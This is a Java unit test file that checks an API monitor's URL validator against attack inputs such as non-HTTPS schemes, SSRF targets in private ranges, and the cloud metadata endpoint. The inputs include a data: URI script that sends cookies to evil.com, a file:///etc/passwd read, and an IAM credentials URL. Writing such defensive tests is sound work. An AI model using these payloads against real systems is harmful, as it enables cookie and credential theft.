package com.example.apimonitor.service;

import com.example.apimonitor.repository.ApiEndpointRepository;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.mockito.Mock;
import org.mockito.junit.jupiter.MockitoExtension;
import org.springframework.web.reactive.function.client.WebClient;

import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.Mockito.when;

/**
 * Security-focused unit tests for {@link HealthCheckService#validateUrl(String)}.
 *
 * All attack vectors below are caught by the pattern-check or scheme-check BEFORE
 * any DNS resolution occurs, so no real network calls are made.
 *
 * Categories tested:
 *   1. Non-HTTPS schemes (javascript:, file:, ftp:, data:, http:)
 *   2. SSRF — private / loopback address ranges (pattern-blocked before DNS)
 *   3. Cloud-metadata endpoint (169.254.169.254)
 *   4. Malformed / missing host
 *   5. Oversized URL
 *   6. Null URL
 */
@ExtendWith(MockitoExtension.class)
@DisplayName("HealthCheckService.validateUrl — security attack vectors")
class HealthCheckServiceSecurityTest {

    @Mock private ApiEndpointRepository repository;
    @Mock private WebClient.Builder webClientBuilder;
    @Mock private WebClient webClient;

    private HealthCheckService service;

    @BeforeEach
    void setUp() {
        when(webClientBuilder.build()).thenReturn(webClient);
        service = new HealthCheckService(repository, webClientBuilder);
    }

    // ── 1. Non-HTTPS schemes ───────────────────────────────────────────────

    @Test
    @DisplayName("HTTP scheme is rejected")
    void rejects_httpScheme() {
        assertThatThrownBy(() -> service.validateUrl("http://api.example.com/health"))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("HTTPS");
    }

    @Test
    @DisplayName("javascript: URI is rejected (scheme check)")
    void rejects_javascriptScheme() {
        assertThatThrownBy(() -> service.validateUrl("javascript:alert(document.cookie)"))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    @DisplayName("file: URI is rejected — cannot read local filesystem")
    void rejects_fileScheme() {
        assertThatThrownBy(() -> service.validateUrl("file:///etc/passwd"))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    @DisplayName("ftp: URI is rejected")
    void rejects_ftpScheme() {
        assertThatThrownBy(() -> service.validateUrl("ftp://files.example.com/secret.tar.gz"))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    @DisplayName("data: URI is rejected")
    void rejects_dataUri() {
        // data: URIs can be used to exfiltrate data or trigger browser-side execution
        assertThatThrownBy(() ->
                service.validateUrl("data:text/html,<script>fetch('https://evil.com?c='+document.cookie)</script>"))
                .isInstanceOf(IllegalArgumentException.class);
    }

    // ── 2. SSRF — private / loopback ranges (all caught by pattern, no DNS) ─

    @ParameterizedTest(name = "rejects SSRF target: {0}")
    @ValueSource(strings = {
            // Loopback
            "https://localhost/",
            "https://localhost:8080/actuator/env",
            "https://127.0.0.1/",
            "https://127.0.0.2/internal",
            "https://127.255.255.255/secret",
            // IPv6 loopback
            "https://[::1]/",
            // All-zeros
            "https://0.0.0.0/",
            // RFC-1918 class A
            "https://10.0.0.1/",
            "https://10.255.255.255/admin",
            // RFC-1918 class B
            "https://172.16.0.1/",
            "https://172.20.0.5/internal",
            "https://172.31.255.255/",
            // RFC-1918 class C
            "https://192.168.0.1/router/config",
            "https://192.168.100.50/",
    })
    @DisplayName("SSRF via private/loopback IP is rejected")
    void rejects_ssrfPrivateRange(String url) {
        assertThatThrownBy(() -> service.validateUrl(url))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("Private");
    }

    @Test
    @DisplayName("AWS/GCP/Azure cloud metadata endpoint is rejected (link-local 169.254.x)")
    void rejects_cloudMetadataEndpoint() {
        // 169.254.169.254 is the well-known instance metadata service on all major clouds.
        // Accessing it from inside a container could expose IAM credentials.
        assertThatThrownBy(() ->
                service.validateUrl("https://169.254.169.254/latest/meta-data/iam/security-credentials/"))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("Private");
    }

    @Test
    @DisplayName("link-local range 169.254.x (other address) is rejected")
    void rejects_otherLinkLocal() {
        assertThatThrownBy(() -> service.validateUrl("https://169.254.0.1/"))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("Private");
    }

    // ── 3. Malformed / empty / missing host ───────────────────────────────

    @Test
    @DisplayName("URL with no host component is rejected")
    void rejects_missingHost() {
        assertThatThrownBy(() -> service.validateUrl("https:///path/to/resource"))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("host");
    }

    @Test
    @DisplayName("Completely malformed string is rejected")
    void rejects_notAUrl() {
        assertThatThrownBy(() -> service.validateUrl("not-a-url-at-all"))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    @DisplayName("Empty string is rejected")
    void rejects_emptyString() {
        assertThatThrownBy(() -> service.validateUrl(""))
                .isInstanceOf(IllegalArgumentException.class);
    }

    @Test
    @DisplayName("HTTPS with empty path after host is rejected when host is missing")
    void rejects_httpsSchemeOnly() {
        assertThatThrownBy(() -> service.validateUrl("https://"))
                .isInstanceOf(IllegalArgumentException.class);
    }

    // ── 4. Oversized URL ──────────────────────────────────────────────────

    @Test
    @DisplayName("URL exceeding 500 characters is rejected (prevents log injection / storage abuse)")
    void rejects_urlOver500Chars() {
        // 501-char URL: https://example.com/ + 481 'a' chars
        String oversized = "https://example.com/" + "a".repeat(481);
        assertThatThrownBy(() -> service.validateUrl(oversized))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("500");
    }

    @Test
    @DisplayName("URL of exactly 500 characters is accepted (boundary)")
    void accepts_urlAtExactly500Chars() {
        // https://example.com/ = 20 chars; pad to exactly 500
        String boundary = "https://example.com/" + "a".repeat(480);
        // Must not throw (note: DNS resolution of example.com happens here)
        // If DNS is unavailable in CI this test may fail — that's acceptable network-dependency behaviour
        // The purpose is purely to confirm the boundary condition is correct
        // For environments without external DNS, catching UnknownHostException is fine
        try {
            service.validateUrl(boundary);
        } catch (IllegalArgumentException e) {
            // Only acceptable failure is DNS resolution failure, not the length check
            org.assertj.core.api.Assertions.assertThat(e.getMessage())
                    .doesNotContain("500");
        }
    }

    // ── 5. Null ────────────────────────────────────────────────────────────

    @Test
    @DisplayName("null URL is rejected")
    void rejects_null() {
        assertThatThrownBy(() -> service.validateUrl(null))
                .isInstanceOf(IllegalArgumentException.class)
                .hasMessageContaining("500");
    }
}
